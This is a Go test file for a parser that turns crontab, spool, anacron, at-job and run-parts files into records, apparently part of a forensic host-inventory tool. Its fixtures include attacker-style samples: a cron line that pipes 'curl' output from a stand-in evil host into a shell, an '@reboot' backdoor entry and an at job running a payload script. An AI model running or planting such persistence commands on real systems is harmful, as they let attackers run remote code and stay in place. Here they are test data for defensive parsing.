package cron

import (
	"bytes"
	"encoding/json"
	"strings"
	"testing"

	"github.com/get-sybers/gopinfo/record"
)

func run(t *testing.T, fam, owner, base, rel, content string) []map[string]any {
	t.Helper()
	var buf bytes.Buffer
	w := record.NewWriter(&buf)
	if _, err := parseByFamily(strings.NewReader(content), fam, owner, base, rel, w); err != nil {
		t.Fatal(err)
	}
	w.Flush()
	var out []map[string]any
	for _, l := range strings.Split(strings.TrimSpace(buf.String()), "\n") {
		if l == "" {
			continue
		}
		var m map[string]any
		json.Unmarshal([]byte(l), &m)
		out = append(out, m)
	}
	return out
}

func TestSystemCrontab(t *testing.T) {
	content := "# m h dom mon dow user command\nSHELL=/bin/sh\n" +
		"17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n" +
		"@reboot root /opt/backdoor.sh\n"
	recs := run(t, "system", "", "crontab", "etc/crontab", content)
	if len(recs) != 3 {
		t.Fatalf("count %d: %v", len(recs), recs)
	}
	if recs[0]["RecordType"] != "crontab_env" || recs[0]["Name"] != "SHELL" || recs[0]["Value"] != "/bin/sh" {
		t.Fatalf("env: %v", recs[0])
	}
	if recs[1]["Schedule"] != "17 * * * *" || recs[1]["User"] != "root" ||
		recs[1]["Command"] != "cd / && run-parts --report /etc/cron.hourly" {
		t.Fatalf("entry: %v", recs[1])
	}
	if recs[2]["Schedule"] != "@reboot" || recs[2]["Command"] != "/opt/backdoor.sh" {
		t.Fatalf("reboot: %v", recs[2])
	}
}

func TestSpoolCrontabNoUserColumn(t *testing.T) {
	recs := run(t, "spool", "alice", "alice", "var/spool/cron/crontabs/alice",
		"*/5 * * * * curl -s http://evil.example/x | sh\n")
	if recs[0]["SpoolOwner"] != "alice" || recs[0]["User"] != nil ||
		recs[0]["Command"] != "curl -s http://evil.example/x | sh" {
		t.Fatalf("spool: %v", recs[0])
	}
}

func TestAnacrontab(t *testing.T) {
	recs := run(t, "anacron", "", "anacrontab", "etc/anacrontab",
		"RANDOM_DELAY=45\n7\t25\tcron.weekly\trun-parts /etc/cron.weekly\n")
	if recs[1]["Period"] != "7" || recs[1]["JobID"] != "cron.weekly" ||
		recs[1]["Command"] != "run-parts /etc/cron.weekly" {
		t.Fatalf("anacron: %v", recs[1])
	}
}

func TestAtJob(t *testing.T) {
	script := "#!/bin/sh\n# atrun uid=1000 gid=1000\n# mail alice 0\numask 22\ncd /home/alice || exit 1\n/tmp/payload.sh\n"
	recs := run(t, "at", "", "a00001019ff488", "var/spool/at/a00001019ff488", script)
	if recs[0]["JobID"] != "a00001019ff488" || recs[0]["AtUID"] != "1000" ||
		!strings.Contains(recs[0]["Script"].(string), "/tmp/payload.sh") {
		t.Fatalf("at: %v", recs[0])
	}
}

func TestRunParts(t *testing.T) {
	recs := run(t, "runparts", "", "0anacron", "etc/cron.daily/0anacron", "")
	if recs[0]["RecordType"] != "cron_runparts" || recs[0]["Name"] != "0anacron" ||
		recs[0]["Value"] != "cron.daily" {
		t.Fatalf("runparts: %v", recs[0])
	}
}

func TestFamily(t *testing.T) {
	cases := map[string][2]string{
		"etc/crontab":                        {"system", ""},
		"etc/cron.d/backup":                  {"system", ""},
		"etc/cron.daily/logrotate":           {"runparts", ""},
		"var/spool/cron/crontabs/alice":      {"spool", "alice"},
		"var/spool/cron/bob":                 {"spool", "bob"},
		"var/spool/at/a00001019ff488":        {"at", ""},
		"var/spool/cron/atjobs/a00002019ff4": {"at", ""},
		"etc/anacrontab":                     {"anacron", ""},
		"etc/passwd":                         {"", ""},
		"var/log/cron":                       {"", ""},
	}
	for in, want := range cases {
		f, o := family(in)
		if f != want[0] || o != want[1] {
			t.Errorf("family(%q) = %q,%q want %q,%q", in, f, o, want[0], want[1])
		}
	}
}
